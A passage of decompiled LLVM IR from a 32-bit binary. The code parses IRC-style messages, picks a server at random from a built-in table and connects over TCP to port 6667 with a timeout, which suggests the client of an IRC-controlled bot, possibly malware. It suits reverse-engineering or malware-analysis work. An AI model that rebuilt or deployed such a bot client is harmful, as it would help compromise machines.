  br i1 %v2_1000393454, label %dec_label_pc_1000393c, label %dec_label_pc_10003950

dec_label_pc_100039a4.preheader:                  ; preds = %dec_label_pc_10003974
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10003954, i32* @r3, align 4
  %v0_100039ac42 = call i32 @function_10007284()
  %v0_100039b443 = load i32, i32* %r29.global-to-local, align 4
  %v2_100039b444 = icmp ult i32 %v0_100039b443, %v0_100039ac42
  br i1 %v2_100039b444, label %dec_label_pc_100039bc, label %dec_label_pc_100039dc

dec_label_pc_10003998:                            ; preds = %dec_label_pc_100039bc
  %v1_1000399c = add i32 %storemerge1047, 1
  store i32 %v1_1000399c, i32* %r29.global-to-local, align 4
  store i32 %v1_10003954, i32* @r3, align 4
  %v0_100039ac = call i32 @function_10007284()
  %v0_100039b4 = load i32, i32* %r29.global-to-local, align 4
  %v2_100039b4 = icmp ult i32 %v0_100039b4, %v0_100039ac
  br i1 %v2_100039b4, label %dec_label_pc_100039bc, label %dec_label_pc_100039dc

dec_label_pc_100039bc:                            ; preds = %dec_label_pc_100039a4.preheader, %dec_label_pc_10003998
  %storemerge1047 = phi i32 [ %v1_1000399c, %dec_label_pc_10003998 ], [ 0, %dec_label_pc_100039a4.preheader ]
  %v2_100039c8 = add i32 %storemerge1047, %v1_10003954
  %v1_100039cc = inttoptr i32 %v2_100039c8 to i8*
  %v2_100039cc = load i8, i8* %v1_100039cc, align 1
  %v3_100039d4 = icmp eq i8 %v2_100039cc, 32
  br i1 %v3_100039d4, label %dec_label_pc_100039dc, label %dec_label_pc_10003998

dec_label_pc_100039dc:                            ; preds = %dec_label_pc_10003998, %dec_label_pc_100039bc, %dec_label_pc_100039a4.preheader
  %storemerge10.lcssa = phi i32 [ 0, %dec_label_pc_100039a4.preheader ], [ %v1_1000399c, %dec_label_pc_10003998 ], [ %storemerge1047, %dec_label_pc_100039bc ]
  %v2_100039e8 = add i32 %storemerge10.lcssa, %v1_10003954
  %v3_100039f0 = inttoptr i32 %v2_100039e8 to i8*
  store i8 0, i8* %v3_100039f0, align 1
  %v3_100039f8 = load i32, i32* @global_var_10010474.145, align 4
  store i32 %v1_10003954, i32* @r3, align 4
  store i32 %v3_100039f8, i32* @r4, align 4
  %v3_10003a04 = call i32 @function_1000770c(i32 %v1_10003954, i32 %v3_100039f8)
  %v3_10003a0c = icmp eq i32 %v3_10003a04, 0
  br i1 %v3_10003a0c, label %dec_label_pc_10003a14, label %dec_label_pc_10003c2c

dec_label_pc_10003a14:                            ; preds = %dec_label_pc_100039dc
  %v3_10003a18 = load i32, i32* @global_var_10010464.16, align 4
  %v3_10003a1c = icmp eq i32 %v3_10003a18, 0
  br i1 %v3_10003a1c, label %dec_label_pc_10003a24, label %dec_label_pc_10003c2c

dec_label_pc_10003a24:                            ; preds = %dec_label_pc_10003a14
  br label %dec_label_pc_10003a58.preheader

dec_label_pc_10003a40:                            ; preds = %dec_label_pc_10003a70
  %v4_10003a70 = ptrtoint i8* %stack_var_-68.234 to i32
  %v1_10003a44 = add i32 %v4_10003a70, 1
  %v5_10003a48 = inttoptr i32 %v1_10003a44 to i8*
  %v1_10003a50 = add i32 %stack_var_-60.233, 1
  store i32 %v1_10003a50, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003a60 = call i32 @function_10007284()
  %v0_10003a68 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003a68 = icmp ult i32 %v0_10003a68, %v0_10003a60
  br i1 %v2_10003a68, label %dec_label_pc_10003a70, label %dec_label_pc_10003a84

dec_label_pc_10003a70:                            ; preds = %dec_label_pc_10003a58.preheader, %dec_label_pc_10003a40
  %stack_var_-68.234 = phi i8* [ %v5_10003a48, %dec_label_pc_10003a40 ], [ %stack_var_-68.340, %dec_label_pc_10003a58.preheader ]
  %stack_var_-60.233 = phi i32 [ %v1_10003a50, %dec_label_pc_10003a40 ], [ %stack_var_-60.339, %dec_label_pc_10003a58.preheader ]
  %v2_10003a74 = load i8, i8* %stack_var_-68.234, align 1
  %v3_10003a7c = icmp eq i8 %v2_10003a74, 32
  br i1 %v3_10003a7c, label %dec_label_pc_10003a84, label %dec_label_pc_10003a40

dec_label_pc_10003a84:                            ; preds = %dec_label_pc_10003a40, %dec_label_pc_10003a70, %dec_label_pc_10003a58.preheader
  %stack_var_-60.2.lcssa = phi i32 [ %stack_var_-60.339, %dec_label_pc_10003a58.preheader ], [ %v1_10003a50, %dec_label_pc_10003a40 ], [ %stack_var_-60.233, %dec_label_pc_10003a70 ]
  %stack_var_-68.2.lcssa = phi i8* [ %stack_var_-68.340, %dec_label_pc_10003a58.preheader ], [ %v5_10003a48, %dec_label_pc_10003a40 ], [ %stack_var_-68.234, %dec_label_pc_10003a70 ]
  %v4_10003a84 = ptrtoint i8* %stack_var_-68.2.lcssa to i32
  %v1_10003a88 = add i32 %v4_10003a84, 1
  store i32 %stack_var_-60.2.lcssa, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003a98 = call i32 @function_10007284()
  %v0_10003aa0 = load i32, i32* %r29.global-to-local, align 4
  %v4_10003aa0 = icmp eq i32 %v0_10003aa0, %v0_10003a98
  br i1 %v4_10003aa0, label %dec_label_pc_10003c2c, label %dec_label_pc_10003aa8

dec_label_pc_10003aa8:                            ; preds = %dec_label_pc_10003a84
  %v5_10003a8c = inttoptr i32 %v1_10003a88 to i8*
  %v1_10003aac = add nuw nsw i32 %storemerge1141, 1
  %tmp93 = icmp slt i32 %v1_10003aac, 3
  br i1 %tmp93, label %dec_label_pc_10003a58.preheader, label %dec_label_pc_10003ad8.preheader

dec_label_pc_10003a58.preheader:                  ; preds = %dec_label_pc_10003a24, %dec_label_pc_10003aa8
  %storemerge1141 = phi i32 [ 0, %dec_label_pc_10003a24 ], [ %v1_10003aac, %dec_label_pc_10003aa8 ]
  %stack_var_-68.340 = phi i8* [ %arg3, %dec_label_pc_10003a24 ], [ %v5_10003a8c, %dec_label_pc_10003aa8 ]
  %stack_var_-60.339 = phi i32 [ 0, %dec_label_pc_10003a24 ], [ %stack_var_-60.2.lcssa, %dec_label_pc_10003aa8 ]
  store i32 %stack_var_-60.339, i32* %r29.global-to-local, align 4
  store i32 %tmp, i32* @r3, align 4
  %v0_10003a6028 = call i32 @function_10007284()
  %v0_10003a6829 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003a6830 = icmp ult i32 %v0_10003a6829, %v0_10003a6028
  br i1 %v2_10003a6830, label %dec_label_pc_10003a70, label %dec_label_pc_10003a84

dec_label_pc_10003ad8.preheader:                  ; preds = %dec_label_pc_10003aa8
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v1_10003a88, i32* @r3, align 4
  %v0_10003ae019 = call i32 @function_10007284()
  %v0_10003ae820 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003ae821 = icmp ult i32 %v0_10003ae820, %v0_10003ae019
  br i1 %v2_10003ae821, label %dec_label_pc_10003af0, label %dec_label_pc_10003b10

dec_label_pc_10003acc:                            ; preds = %dec_label_pc_10003af0
  %v1_10003ad0 = add i32 %storemerge1224, 1
  store i32 %v1_10003ad0, i32* %r29.global-to-local, align 4
  store i32 %v1_10003a88, i32* @r3, align 4
  %v0_10003ae0 = call i32 @function_10007284()
  %v0_10003ae8 = load i32, i32* %r29.global-to-local, align 4
  %v2_10003ae8 = icmp ult i32 %v0_10003ae8, %v0_10003ae0
  br i1 %v2_10003ae8, label %dec_label_pc_10003af0, label %dec_label_pc_10003b10

dec_label_pc_10003af0:                            ; preds = %dec_label_pc_10003ad8.preheader, %dec_label_pc_10003acc
  %storemerge1224 = phi i32 [ %v1_10003ad0, %dec_label_pc_10003acc ], [ 0, %dec_label_pc_10003ad8.preheader ]
  %v2_10003afc = add i32 %storemerge1224, %v1_10003a88
  %v1_10003b00 = inttoptr i32 %v2_10003afc to i8*
  %v2_10003b00 = load i8, i8* %v1_10003b00, align 1
  %v3_10003b08 = icmp eq i8 %v2_10003b00, 32
  br i1 %v3_10003b08, label %dec_label_pc_10003b10, label %dec_label_pc_10003acc

dec_label_pc_10003b10:                            ; preds = %dec_label_pc_10003acc, %dec_label_pc_10003af0, %dec_label_pc_10003ad8.preheader
  %storemerge12.lcssa = phi i32 [ 0, %dec_label_pc_10003ad8.preheader ], [ %v1_10003ad0, %dec_label_pc_10003acc ], [ %storemerge1224, %dec_label_pc_10003af0 ]
  %v2_10003b1c = add i32 %storemerge12.lcssa, %v1_10003a88
  %v3_10003b24 = inttoptr i32 %v2_10003b1c to i8*
  store i8 0, i8* %v3_10003b24, align 1
  store i32 268450608, i32* @lr, align 4
  %v2_10003b2c = call i32 @function_10007b1c(i32 %v1_10003a88)
  %v5_10003b34 = trunc i32 %v2_10003b2c to i8
  store i8 %v5_10003b34, i8* %stack_var_-56, align 1
  %v4_10003b40 = icmp eq i8 %v5_10003b34, -1
  br i1 %v4_10003b40, label %dec_label_pc_10003b48, label %dec_label_pc_10003bb4

dec_label_pc_10003b48:                            ; preds = %dec_label_pc_10003b10
  store i32 268450640, i32* @lr, align 4
  %v3_10003b4c = call i32 @function_10007b50(i32 %v1_10003a88, i32 %v2_10003b2c)
  %v3_10003b5c = icmp eq i32 %v3_10003b4c, 0
  br i1 %v3_10003b5c, label %dec_label_pc_10003b64, label %dec_label_pc_10003b88

dec_label_pc_10003b64:                            ; preds = %dec_label_pc_10003b48
  %v3_10003b68 = load i32, i32* @global_var_10010488.143, align 4
  %v5_10003b80 = call i32 @function_1000041c(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_1000e1a8.163 to i32), i32 %v3_10003b68, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  br label %dec_label_pc_10003c2c

dec_label_pc_10003b88:                            ; preds = %dec_label_pc_10003b48
  %v2_10003b88 = ptrtoint i8* %stack_var_-56 to i32
  %v1_10003b90 = add i32 %v3_10003b4c, 16
  %v2_10003b90 = inttoptr i32 %v1_10003b90 to i32*
  %v3_10003b90 = load i32, i32* %v2_10003b90, align 4
  %v1_10003b94 = inttoptr i32 %v3_10003b90 to i32*
  %v2_10003b94 = load i32, i32* %v1_10003b94, align 4
  %v1_10003b9c = add i32 %v3_10003b4c, 12
  %v2_10003b9c = inttoptr i32 %v1_10003b9c to i32*
  %v3_10003b9c = load i32, i32* %v2_10003b9c, align 4
  store i32 %v2_10003b88, i32* @r3, align 4
  store i32 %v2_10003b94, i32* @r4, align 4
  store i32 %v3_10003b9c, i32* @r5, align 4
  store i32 268450740, i32* @lr, align 4
  %v0_10003bb0 = call i32 @function_10007104()
  %v2_10003bc4.pre = load i8, i8* %stack_var_-56, align 1
  br label %dec_label_pc_10003bb4

dec_label_pc_10003bb4:                            ; preds = %dec_label_pc_10003b10, %dec_label_pc_10003b88
  %v0_10003c4476 = phi i32 [ %v0_10003bb0, %dec_label_pc_10003b88 ], [ %v2_10003b2c, %dec_label_pc_10003b10 ]
  %v2_10003bc4 = phi i8 [ %v2_10003bc4.pre, %dec_label_pc_10003b88 ], [ %v5_10003b34, %dec_label_pc_10003b10 ]
  store i8 %v2_10003bc4, i8* bitcast (i8** @global_var_10010463.165 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_10010460.15 to i8*), align 4
  store i32 256, i32* @global_var_10010464.16, align 4
  br label %dec_label_pc_10003c2c

dec_label_pc_10003c2c:                            ; preds = %dec_label_pc_10003950, %dec_label_pc_10003a84, %dec_label_pc_10003a14, %dec_label_pc_100039dc, %dec_label_pc_10003b64, %dec_label_pc_10003bb4
  %v0_10003c44 = phi i32 [ 0, %dec_label_pc_10003a14 ], [ %v3_10003a04, %dec_label_pc_100039dc ], [ %v5_10003b80, %dec_label_pc_10003b64 ], [ %v0_10003c4476, %dec_label_pc_10003bb4 ], [ %v0_10003a98, %dec_label_pc_10003a84 ], [ %v0_10003964, %dec_label_pc_10003950 ]
  %v2_10003c2c = load i32, i32* %stack_var_-80, align 4
  %v1_10003c38 = add i32 %v2_10003c2c, -12
  %v2_10003c38 = inttoptr i32 %v1_10003c38 to i32*
  %v3_10003c38 = load i32, i32* %v2_10003c38, align 4
  store i32 %v3_10003c38, i32* %r29.global-to-local, align 4
  ret i32 %v0_10003c44

; uselistorder directives
  uselistorder i32 %v2_10003b2c, { 1, 0, 2 }
  uselistorder i32 %stack_var_-60.339, { 2, 0, 1 }
  uselistorder i32 %v1_10003aac, { 1, 0 }
  uselistorder i32 %v1_10003a88, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %stack_var_-60.163, { 2, 0, 1 }
  uselistorder i32 %v1_10003978, { 1, 0 }
  uselistorder i32 %v1_10003954, { 3, 2, 0, 1, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %r29.global-to-local, { 4, 5, 6, 17, 18, 0, 1, 7, 8, 9, 10, 11, 12, 2, 3, 19, 20, 13, 14, 15, 16 }
  uselistorder i8** @global_var_10010460.15, { 0, 4, 3, 2, 1 }
  uselistorder i32* @global_var_10010464.16, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i8* %arg3, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003c2c, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_10003bb4, { 1, 0 }
  uselistorder label %dec_label_pc_10003b10, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10003af0, { 1, 0 }
  uselistorder label %dec_label_pc_10003a58.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10003a84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100039dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100039bc, { 1, 0 }
  uselistorder label %dec_label_pc_10003924.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10003950, { 2, 1, 0 }
}

define i32 @function_10003c48(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10003c48:
  %v3_10003c6c = load i32, i32* @global_var_10010474.145, align 4
  store i32 %v3_10003c6c, i32* @r3, align 4
  store i32 268450936, i32* @lr, align 4
  %v0_10003c74 = call i32 @function_100081f4()
  store i32 268450940, i32* @lr, align 4
  %v0_10003c78 = call i32 @function_100007d4()
  store i32 %v0_10003c78, i32* @global_var_10010474.145, align 4
  ret i32 %v0_10003c78
}

define i32 @function_10003ca0(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_10003ca0:
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 %arg2, i32* @r3, align 4
  %v0_10003ce43 = call i32 @function_10007284()
  %v2_10003cec5 = icmp eq i32 %v0_10003ce43, 0
  br i1 %v2_10003cec5, label %dec_label_pc_10003d14, label %dec_label_pc_10003cf4

dec_label_pc_10003cd0:                            ; preds = %dec_label_pc_10003cf4
  %v1_10003cd4 = add i32 %storemerge28, 1
  store i32 %arg2, i32* @r3, align 4
  %v0_10003ce4 = call i32 @function_10007284()
  %v2_10003cec = icmp ult i32 %v1_10003cd4, %v0_10003ce4
  br i1 %v2_10003cec, label %dec_label_pc_10003cf4, label %dec_label_pc_10003d14

dec_label_pc_10003cf4:                            ; preds = %dec_label_pc_10003ca0, %dec_label_pc_10003cd0
  %storemerge28 = phi i32 [ %v1_10003cd4, %dec_label_pc_10003cd0 ], [ 0, %dec_label_pc_10003ca0 ]
  %v2_10003d00 = add i32 %storemerge28, %arg2
  %v1_10003d04 = inttoptr i32 %v2_10003d00 to i8*
  %v2_10003d04 = load i8, i8* %v1_10003d04, align 1
  %v3_10003d0c = icmp eq i8 %v2_10003d04, 33
  br i1 %v3_10003d0c, label %dec_label_pc_10003d14, label %dec_label_pc_10003cd0

dec_label_pc_10003d14:                            ; preds = %dec_label_pc_10003ca0, %dec_label_pc_10003cd0, %dec_label_pc_10003cf4
  %storemerge2.lcssa = phi i32 [ 0, %dec_label_pc_10003ca0 ], [ %v1_10003cd4, %dec_label_pc_10003cd0 ], [ %storemerge28, %dec_label_pc_10003cf4 ]
  %v2_10003d20 = add i32 %storemerge2.lcssa, %arg2
  %v3_10003d28 = inttoptr i32 %v2_10003d20 to i8*
  store i8 0, i8* %v3_10003d28, align 1
  %v3_10003d30 = load i32, i32* @global_var_10010474.145, align 4
  store i32 %arg2, i32* @r3, align 4
  store i32 %v3_10003d30, i32* @r4, align 4
  %v2_10003d3c = call i32 @function_1000770c(i32 %arg2, i32 %v3_10003d30)
  %v3_10003d44 = icmp eq i32 %v2_10003d3c, 0
  br i1 %v3_10003d44, label %dec_label_pc_10003d4c, label %dec_label_pc_10003da0

dec_label_pc_10003d4c:                            ; preds = %dec_label_pc_10003d14
  %v2_10003d50 = load i8, i8* %arg3, align 1
  %v3_10003d58 = icmp eq i8 %v2_10003d50, 58
  br i1 %v3_10003d58, label %dec_label_pc_10003d60, label %dec_label_pc_10003d6c

dec_label_pc_10003d60:                            ; preds = %dec_label_pc_10003d4c
  %v1_10003d64 = add i32 %tmp, 1
  %v5_10003d68 = inttoptr i32 %v1_10003d64 to i8*
  br label %dec_label_pc_10003d6c

dec_label_pc_10003d6c:                            ; preds = %dec_label_pc_10003d4c, %dec_label_pc_10003d60
  %stack_var_-32.0 = phi i8* [ %v5_10003d68, %dec_label_pc_10003d60 ], [ %arg3, %dec_label_pc_10003d4c ]
  %v3_10003d70 = load i32, i32* @global_var_10010474.145, align 4
  %v3_10003d74 = icmp eq i32 %v3_10003d70, 0
  br i1 %v3_10003d74, label %dec_label_pc_10003d8c, label %dec_label_pc_10003d7c

dec_label_pc_10003d7c:                            ; preds = %dec_label_pc_10003d6c
  store i32 %v3_10003d70, i32* @r3, align 4
  store i32 268451212, i32* @lr, align 4
  %v0_10003d88 = call i32 @function_100081f4()
  br label %dec_label_pc_10003d8c

dec_label_pc_10003d8c:                            ; preds = %dec_label_pc_10003d6c, %dec_label_pc_10003d7c
  %v4_10003d8c = ptrtoint i8* %stack_var_-32.0 to i32
  store i32 268451220, i32* @lr, align 4
  %v2_10003d90 = call i32 @function_1000775c(i32 %v4_10003d8c)
  store i32 %v2_10003d90, i32* @global_var_10010474.145, align 4
  br label %dec_label_pc_10003da0

dec_label_pc_10003da0:                            ; preds = %dec_label_pc_10003d14, %dec_label_pc_10003d8c
  %v0_10003db8 = phi i32 [ %v2_10003d3c, %dec_label_pc_10003d14 ], [ %v2_10003d90, %dec_label_pc_10003d8c ]
  ret i32 %v0_10003db8

; uselistorder directives
  uselistorder i32 %v1_10003cd4, { 1, 2, 0 }
  uselistorder i32 %arg2, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_10003da0, { 1, 0 }
  uselistorder label %dec_label_pc_10003d8c, { 1, 0 }
  uselistorder label %dec_label_pc_10003d6c, { 1, 0 }
  uselistorder label %dec_label_pc_10003d14, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10003cf4, { 1, 0 }
}

define i32 @function_10003dbc() local_unnamed_addr {
dec_label_pc_10003dbc:
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v2_10003ef4 = ptrtoint i32* %stack_var_-28 to i32
  %v2_10003ef8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_10003f50 = ptrtoint i32* %stack_var_-12 to i32
  br label %dec_label_pc_10003dd4

dec_label_pc_10003dd4:                            ; preds = %dec_label_pc_10003dd4.backedge, %dec_label_pc_10003dbc
  store i32 -1, i32* @global_var_10010478.10, align 4
  store i32 1, i32* %stack_var_-12, align 4
  %v3_10003dec = load i32, i32* @global_var_10010458.107, align 4
  %v3_10003df0 = icmp eq i32 %v3_10003dec, 0
  br i1 %v3_10003df0, label %dec_label_pc_10003df8, label %dec_label_pc_10003e30

dec_label_pc_10003df8:                            ; preds = %dec_label_pc_10003dd4
  store i32 268451324, i32* @lr, align 4
  %v0_10003df8 = call i32 @function_100086d4()
  %v3_10003e04 = load i32, i32* @global_var_10010410.168, align 4
  %v2_10003e08 = srem i32 %v0_10003df8, %v3_10003e04
  %v1_10003e1c = mul i32 %v2_10003e08, 4
  %v2_10003e20 = add i32 %v1_10003e1c, ptrtoint ([16 x i8]** @global_var_10010414.170 to i32)
  %v1_10003e24 = inttoptr i32 %v2_10003e20 to i32*
  %v2_10003e24 = load i32, i32* %v1_10003e24, align 4
  store i32 %v2_10003e24, i32* @global_var_10010480.106, align 4
  br label %dec_label_pc_10003e30

dec_label_pc_10003e30:                            ; preds = %dec_label_pc_10003dd4, %dec_label_pc_10003df8
  store i32 0, i32* @global_var_10010458.107, align 4
  br label %dec_label_pc_10003e3c

dec_label_pc_10003e3c:                            ; preds = %dec_label_pc_10003e3c, %dec_label_pc_10003e30
  store i32 268451404, i32* @lr, align 4
  %v3_10003e48 = call i32 @function_10008068(i32 2, i32 1, i32 6)
  store i32 %v3_10003e48, i32* @global_var_10010478.10, align 4
  %v1_10003e60 = icmp slt i32 %v3_10003e48, 0
  br i1 %v1_10003e60, label %dec_label_pc_10003e3c, label %dec_label_pc_10003e68

dec_label_pc_10003e68:                            ; preds = %dec_label_pc_10003e3c
  %v3_10003e6c = load i32, i32* @global_var_10010480.106, align 4
  store i32 268451448, i32* @lr, align 4
  %v1_10003e74 = call i32 @function_10007b1c(i32 %v3_10003e6c)
  %v3_10003e7c = icmp eq i32 %v1_10003e74, 0
  br i1 %v3_10003e7c, label %dec_label_pc_10003ea4, label %dec_label_pc_10003e84

dec_label_pc_10003e84:                            ; preds = %dec_label_pc_10003e68
  %v3_10003e88 = load i32, i32* @global_var_10010480.106, align 4
  store i32 268451476, i32* @lr, align 4
  %v1_10003e90 = call i32 @function_10007b1c(i32 %v3_10003e88)
  %v4_10003e9c = icmp eq i32 %v1_10003e90, -1
  br i1 %v4_10003e9c, label %dec_label_pc_10003ea4, label %dec_label_pc_10003f18

dec_label_pc_10003ea4:                            ; preds = %dec_label_pc_10003e84, %dec_label_pc_10003e68
  %v3_10003ea8 = load i32, i32* @global_var_10010480.106, align 4
  store i32 268451508, i32* @lr, align 4
  %v2_10003eb0 = call i32 @function_10007b50(i32 %v3_10003ea8, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10003ec0 = icmp eq i32 %v2_10003eb0, 0
  br i1 %v3_10003ec0, label %dec_label_pc_10003ec8, label %dec_label_pc_10003ee8

dec_label_pc_10003ec8:                            ; preds = %dec_label_pc_10003ea4
  store i32 0, i32* @global_var_10010480.106, align 4
  %v3_10003ed8 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451556, i32* @lr, align 4
  %v1_10003ee0 = call i32 @function_10004ab4(i32 %v3_10003ed8)
  br label %dec_label_pc_10003dd4.backedge

dec_label_pc_10003dd4.backedge:                   ; preds = %dec_label_pc_10003ec8, %dec_label_pc_10004080
  br label %dec_label_pc_10003dd4

dec_label_pc_10003ee8:                            ; preds = %dec_label_pc_10003ea4
  %v1_10003eec = add i32 %v2_10003eb0, 16
  %v2_10003eec = inttoptr i32 %v1_10003eec to i32*
  %v3_10003eec = load i32, i32* %v2_10003eec, align 4
  %v1_10003ef0 = inttoptr i32 %v3_10003eec to i32*
  %v2_10003ef0 = load i32, i32* %v1_10003ef0, align 4
  %v1_10003f00 = add i32 %v2_10003eb0, 12
  %v2_10003f00 = inttoptr i32 %v1_10003f00 to i32*
  %v3_10003f00 = load i32, i32* %v2_10003f00, align 4
  store i32 %v3_10003f00, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_10003f14.171 to i32), i32* @lr, align 4
  %v4_10003f10 = call i32 @function_100076fc(i32 %v2_10003ef0, i32 %v2_10003ef8, i32 %v3_10003f00, i32 %v2_10003eb0)
  br label %dec_label_pc_10003f30

dec_label_pc_10003f18:                            ; preds = %dec_label_pc_10003e84
  %v3_10003f1c = load i32, i32* @global_var_10010480.106, align 4
  store i32 268451624, i32* @lr, align 4
  %v1_10003f24 = call i32 @function_10007b1c(i32 %v3_10003f1c)
  store i32 %v1_10003f24, i32* %stack_var_-24, align 4
  br label %dec_label_pc_10003f30

dec_label_pc_10003f30:                            ; preds = %dec_label_pc_10003ee8, %dec_label_pc_10003f18
  store i32 2, i32* %stack_var_-28, align 4
  store i32 6667, i32* @r3, align 4
  %v1_10003f3c = call i32 @function_100079f0(i32 6667)
  %v3_10003f4c = load i32, i32* @global_var_10010478.10, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10003f6c.172 to i32), i32* @lr, align 4
  %v3_10003f68 = call i32 @function_100049cc(i32 %v3_10003f4c, i32 -2147195266, i32 %v2_10003f50)
  store i32 268451700, i32* @lr, align 4
  %v1_10003f70 = call i32 @function_10004d80(i32 0)
  store i32 268451944, i32* @lr, align 4
  %v1_1000406411 = call i32 @function_10004d80(i32 0)
  %v2_1000407412 = sub i32 %v1_1000406411, %v1_10003f70
  %tmp1016 = icmp ult i32 %v2_1000407412, 10
  br i1 %tmp1016, label %dec_label_pc_10003f80, label %dec_label_pc_10004080

dec_label_pc_10003f80:                            ; preds = %dec_label_pc_10003f30, %dec_label_pc_10004058
  %v0_10003f80 = call i32 @function_10004e38()
  %v2_10003f8c = inttoptr i32 %v0_10003f80 to i32*
  store i32 0, i32* %v2_10003f8c, align 4
  %v3_10003f94 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451756, i32* @lr, align 4
  %v3_10003fa8 = call i32 @function_10007f50(i32 %v3_10003f94, i32 %v2_10003ef4, i32 16)
  %v3_10003fb0 = icmp eq i32 %v3_10003fa8, 0
  br i1 %v3_10003fb0, label %dec_label_pc_10003fcc, label %dec_label_pc_10003fb8

dec_label_pc_10003fb8:                            ; preds = %dec_label_pc_10003f80
  %v0_10003fb8 = call i32 @function_10004e38()
  %v1_10003fc0 = inttoptr i32 %v0_10003fb8 to i32*
  %v2_10003fc0 = load i32, i32* %v1_10003fc0, align 4
  %v3_10003fc4 = icmp eq i32 %v2_10003fc0, 106
  br i1 %v3_10003fc4, label %dec_label_pc_10003fcc, label %dec_label_pc_10004030

dec_label_pc_10003fcc:                            ; preds = %dec_label_pc_10003fb8, %dec_label_pc_10003f80
  %v3_10003fd0 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451820, i32* @lr, align 4
  %v6_10003fe8 = call i32 @function_1000802c(i32 %v3_10003fd0, i32 1, i32 13, i32 0, i32 0, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10003ff0 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451852, i32* @lr, align 4
  %v6_10004008 = call i32 @function_1000802c(i32 %v3_10003ff0, i32 1, i32 2, i32 0, i32 0, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_10004010 = load i32, i32* @global_var_10010478.10, align 4
  store i32 ptrtoint (i32* @global_var_1000402c.173 to i32), i32* @lr, align 4
  %v6_10004028 = call i32 @function_1000802c(i32 %v3_10004010, i32 1, i32 9, i32 0, i32 0, i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  ret i32 %v6_10004028

dec_label_pc_10004030:                            ; preds = %dec_label_pc_10003fb8
  %v0_10004030 = call i32 @function_10004e38()
  %v1_10004038 = inttoptr i32 %v0_10004030 to i32*
  %v2_10004038 = load i32, i32* %v1_10004038, align 4
  %v3_1000403c = icmp eq i32 %v2_10004038, 115
  br i1 %v3_1000403c, label %dec_label_pc_10004058, label %dec_label_pc_10004044

dec_label_pc_10004044:                            ; preds = %dec_label_pc_10004030
  %v0_10004044 = call i32 @function_10004e38()
  %v1_1000404c = inttoptr i32 %v0_10004044 to i32*
  %v2_1000404c = load i32, i32* %v1_1000404c, align 4
  %v3_10004050 = icmp eq i32 %v2_1000404c, 114
  br i1 %v3_10004050, label %dec_label_pc_10004058, label %dec_label_pc_10004080

dec_label_pc_10004058:                            ; preds = %dec_label_pc_10004044, %dec_label_pc_10004030
  store i32 ptrtoint ([3 x i8]* @global_var_10004060.174 to i32), i32* @lr, align 4
  %v1_1000405c = call i32 @function_10008f8c(i32 1)
  store i32 268451944, i32* @lr, align 4
  %v1_10004064 = call i32 @function_10004d80(i32 0)
  %v2_10004074 = sub i32 %v1_10004064, %v1_10003f70
  %tmp10 = icmp ult i32 %v2_10004074, 10
  br i1 %tmp10, label %dec_label_pc_10003f80, label %dec_label_pc_10004080

dec_label_pc_10004080:                            ; preds = %dec_label_pc_10004058, %dec_label_pc_10004044, %dec_label_pc_10003f30
  store i32 0, i32* @global_var_10010480.106, align 4
  %v3_10004090 = load i32, i32* @global_var_10010478.10, align 4
  store i32 268451996, i32* @lr, align 4
  %v1_10004098 = call i32 @function_10004ab4(i32 %v3_10004090)
  br label %dec_label_pc_10003dd4.backedge

; uselistorder directives
  uselistorder i32 %v1_10003f70, { 1, 0 }
  uselistorder i32 %v3_10003f00, { 1, 0 }
  uselistorder i32 %v2_10003eb0, { 1, 0, 2, 3 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_1000802c, { 2, 1, 0 }
  uselistorder i32 268451944, { 1, 0 }
  uselistorder i32 (i32)* @function_100079f0, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_100076fc, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_10007b50, { 3, 2, 1, 0 }
  uselistorder i32 ()* @function_100086d4, { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_10003f80, { 1, 0 }
  uselistorder label %dec_label_pc_10003f30, { 1, 0 }
  uselistorder label %dec_label_pc_10003dd4.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10003e30, { 1, 0 }
}

